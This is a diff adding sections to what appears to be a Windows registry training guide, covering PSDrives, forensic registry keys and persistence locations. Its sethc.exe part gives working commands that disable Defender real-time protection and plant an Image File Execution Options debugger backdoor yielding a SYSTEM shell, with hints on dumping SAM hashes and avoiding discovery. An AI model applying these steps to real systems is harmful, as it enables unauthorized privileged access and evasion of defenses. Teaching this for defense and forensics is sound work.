@@ -508,3 +508,264 @@ Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Office\14.0\Security\Trusted
 Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name Test -Value Bacon.exe
 ```
 
+### Sethc.exe Demonstration
+
+   - Demo: Demonstrate the application of a registry "tweak" via the GUI and CMD-line using [sethc.exe](https://hackernoon.com/-windows-sticky-keys-exploit-the-war-veteran-that-never-dies-its-very-likely-that-youve-heard-8ei2duh).
+
+   - What is `sethc.exe`?
+
+       - Windows contains a feature called stick keys, which is an accessibility feature to help Windows users who have physical disabilities.
+
+           - It essentially serializes keystrokes instead of pressing multiple keys at a time, so it allows the user to press and release a modifier key, such as Shift, Ctrl, Alt, or the Windows key, and have it remain active until any other key is pressed.
+
+           - You activate stick keys by pressing the Shift key 5 times. When you activate stick keys, you are launching a file, C:\Windows\System32\sethc.exe, which executes as SYSTEM.
+
+       - While this exploit is protected by current AV, you still might see it in customer networks who don’t follow DISA STIGs.
+	
+**Create a new Registry key using PowerShell** 
+This will create a backdoor onto a box which will trigger Windows Defender. So first we need to disable it.
+
+**Disable Windows Defender Real Time Protection**
+```
+Set-MpPreference -DisableRealtimeMonitoring $TRUE
+```
+
+Sometimes, the previous command may not work as expected. In such cases, you can follow these steps:
+1.	Click the Windows button in the lower-left corner of your desktop.
+2.	Navigate to "Virus & threat protection."
+3.	Under "Virus & threat protection settings," click "Manage settings."
+4.	Finally, toggle off "Real-Time protection." These steps will help you turn off real-time protection using the Windows Security interface.
+
+**Create a new Registry key using New-Item in PowerShell**
+```
+new-item "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
+```
+**Create a new Registry key property using New-ItemProperty in PowerShell**
+```
+New-ItemProperty -path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Name Debugger -Type String -Value C:\Windows\System32\cmd.exe
+```
+**Calling our new value in order to privilege escalate**
+    1. Rapidly press the SHIFT key 5 times
+    2. A command shell opens
+    3. Type whoami
+    4. You should be army\john.huntsman or whoever your user account is
+    5. Now log off the system and press the SHIFT key 5 times
+    6. A command shell opens
+    7. Type whoami
+    8. Now you are NT AUTHORITY\SYSTEM
+
+	As SYSTEM user, we could open the Registry and copy the SAM database to access password hashes
+
+**Create a network share to Sysinternals**
+```
+net use * http://live.sysinternals.com
+```
+    The `net use` command allows us to map a network location and navigate it like it is a local directory.
+
+    You can run `net use` and it will show detailed information about currently mapped drives and devices.
+
+        Additionally you can run `net use /help` for a listing of most common parameters.
+```
+Type *autoruns -accepteula*
+```
+	- If we are running remote operations on a target, if we run a SysInternals command for the first time, we will be prompted by a popup to accept the EULA. The -accepteula switch will prevent this and prevent us from being discovered.
+**Using Autoruns to view the created Registry key**
+	1. In Autoruns, click on the Image Hijacks Button
+	2. Right click on the sethc.exe and select Jump to Entry…​
+	3. Right click on the sethc.exe key and select export
+	4. Name the file "Totally Legit Windows Update" and save it to your Desktop
+	5. Delete the sethc.exe key using the GUI
+
+## PSDrives
+
+**What is a PowerShell PSDrive?**
+
+   - A Windows PowerShell drive is a data store location that you can access like a file system drive in Windows PowerShell.
+
+        You cannot access them by using other Windows tools, such as File Explorer or Cmd.exe.
+
+   - Basically, a [PSDrive](https://docs.microsoft.com/en-us/powershell/scripting/samples/managing-windows-powershell-drives?view=powershell-7.1) creates a temporary or permanent way for PowerShell to navigate the registry just like you could navigate the file system.
+
+   - Another way to create/use a remote connection is to use PSDrive (PowerShell Drive).
+
+   - A group of providers connect different forms of storage to PowerShell and make them look like and perform like a file system.
+
+**Finding current PSDrives**
+```
+Get-PSDrive
+```
+   - To create a new Windows PowerShell drive, you must supply three parameters:
+
+   - A **Name** for the drive (you can use any valid Windows PowerShell name)
+
+   - The **PSProvider** (use "FileSystem" for file system locations, "Registry" for registry locations, and it could also be a shared folder on a remote server.)
+
+   - The **Root**, that is, the path to the root of the new drive.
+
+|PSDrive Providers|
+|---|
+|[Providers](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_providers?view=powershell-7.1): "Registry" - for registry locations, "FileSystem" for file system locations|
+|[Certificate](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/about/about_certificate_provider?view=powershell-7.1): for any installed digital certificates|
+|[Alias](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_alias_provider?view=powershell-7.1): for aliases used by PowerShell|
+|[Function](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_function_provider?view=powershell-7.1): Provides access to the functions defined in PowerShell|
+|[Variable](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_variable_provider?view=powershell-7.1): supports the variables that PowerShell creates, including the automatic variables, the preference variables, and the variables that you create.|
+|[WSMAN](https://docs.microsoft.com/en-us/powershell/module/microsoft.wsman.management/about/about_wsman_provider?view=powershell-7.1): (Web Services Manager)lets you add, change, clear, and delete WS-Management configuration data on local or remote computers.|
+|[Environment](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_provider?view=powershell-7.1): Provides access to the Windows environment variable.|
+
+**Show all Environmental Variables in the Env: directory**
+```
+Get-ChildItem Env:
+```
+**Show all Environmental Variables in the GUI**
+-	Control Panel > System > click on Advanced system settings.
+-	Then click on Environmental Variables.
+-	The results should be the same as GCI ENV.
+
+**Make a directory for our demo**
+```
+mkdir demo
+```
+**Creating a PSDrive**
+```
+New-PSDrive -Name Demo -PSProvider FileSystem -Root c:\Demo   #Review command: Get-Help New-PSDrive for this syntax.
+```
+**Show the difference from changing directory to C:\Demo and Demo:**
+```
+cd C:\Demo
+cd Demo:
+```
+**Creating an invalid PSDrive**
+```
+New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USER
+```
+-	This will create an error. Try and mount the new drive and watch it error out. PowerShell will allow you to create a directory with a Root location that doesn’t exist.
+
+**Mounting invalid PSDrive**
+```
+gci HKU:
+Get-ChildItem HKU:
+```
+**Delete the bad PSDrive**
+```
+Remove-PSDrive HKU
+```
+**Now create the drive correctly**
+```
+New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS
+```
+**Changing directories with PowerShell**
+```
+cd Registry::HKEY_LOCAL_MACHINE 
+cd HKU: 
+C: 
+```
+
+## Forensically Relevant Keys
+
+   - These are keys that hold any type of information that can be used to gather intelligence or track events.
+
+   - These are some but not all of the keys that can be considered relevant to you or your mission set.
+
+   - [SANS Registry Cheat Sheet](https://www.13cubed.com/downloads/dfir_cheat_sheet.pdf)
+
+Why do we care?
+
+   - We are looking for keys that can be used for Persistence
+
+       - Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access
+
+   - As well as Privilege Escalation.
+
+       - Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network.
+
+
+**Microsoft Edge Internet URL history and [Browser Artifacts and Forensics](https://www.digitalforensics.com/blog/an-overview-of-web-browser-forensics/)**
+
+   - `HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\Children\001\Internet Explorer\DOMStorage`
+
+
+**USB history / USB Forensics**
+
+   - `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USB`
+
+       - This registry key contains information about all USB devices that have been connected to the system at some point, regardless of whether they are currently connected or not. It includes information about the USB controllers, hubs, and individual devices. Each device is typically identified by a unique identifier (like a device instance path or hardware ID).
+
+   - `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`
+
+       - This registry key specifically deals with USB storage devices, such as USB flash drives, external hard drives, etc. It contains information about connected USB storage devices, including details like device instance paths, hardware IDs, and other configuration information.
+
+
+**Recent MRU history / [MRU in forensics](https://www.sans.org/blog/opensavemru-and-lastvisitedmru/)**
+
+   - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU`
+
+       - MRU is the abbreviation for most-recently-used.
+
+       - This key maintains a list of recently opened or saved files via typical Windows Explorer-style common dialog boxes (i.e. Open dialog box and Save dialog box).
+
+       - For instance, files (e.g. .txt, .pdf, htm, .jpg) that are recently opened or saved files from within a web browser (including IE and Firefox) are maintained.
+
+**Recent Files [with LNK files](https://ismailtasdelen.medium.com/windows-lnk-file-analysis-in-forensic-it-reviews-75b3dfd49f36#:~:text=The%20concept%20of%20Recent%20Files,importance%20in%20the%20event%20resolution)**
+
+   - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`
+
+**Windows User Profiles [User Account Forensics](https://sechub.medium.com/blue-team-system-live-analysis-part-7-windows-user-account-forensics-categorization-and-87f94d131c1e)**
+
+`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList`
+
+**Saved Network Profiles and [How to decode Network history](https://hatsoffsecurity.com/2014/05/23/network-history-and-decoding-system-time/)**
+
+`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles`
+
+**Windows Virtual Memory [and why it is important](https://azurecloudai.blog/2020/03/03/side-channel-attack-mitigation-via-gpo/)**
+
+`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management`
+
+   - This key maintains Windows virtual memory (paging file) configuration.
+
+   - The paging file (usually C:\pagefile.sys) may contain evidence/important information that could be removed once the suspect computer is shutdown.
+
+**Recent search terms using Windows default search and Cortana**
+
+   - `HKEY_CURRENT_USER\Software\Microsoft\Windows Search\ProcessedSearchRoots`
+
+       - [Index of Search results by SID](https://docs.microsoft.com/en-us/windows/win32/search/-search-3x-wds-extidx-csm-searchroots)
+
+   - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Search`
+
+       - [Recent files searched](https://df-stream.com/2017/10/recentapps/)
+
+### Registry locations that can be utilized for persistence
+
+[Persistence According to MITRE](https://attack.mitre.org/tactics/TA0003/#:~:text=Persistence%20consists%20of%20techniques%20that,could%20cut%20off%20their%20access)
+
+[Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder - MITRE](https://attack.mitre.org/techniques/T1547/001/)
+
+|System-wide and per-user autoruns|
+|`HKLM\Software\Microsoft\Windows\CurrentVersion\Run`|
+|`HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`|
+|`HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Run`|
+|`HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\RunOnce`|
+|`HKLM\SYSTEM\CurrentControlSet\services`|
+|`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`|
+|`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`|
+|`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`|
+
+### ritical Registry Locations
+
+These are keys that have value for red and blue teams to be taken advantage of.
+
+   - HKLM\BCD00000000
+
+       - Replacement of old boot.ini file
+
+   - HKLM\SAM\SAM
+
+       - Use "psexec -s -i regedit" from administrator cmd.exe to view the SAM
+           - It opens a new regedit.exe window with system permissions
+            	PSEXEC is a SYSINTERNALS tool.
+
+   - HKU\<SID>\Software\Policies\Microsoft\Windows\System\Scripts
+
+       - Group policy Logon/Logoff Scripts defined here
+
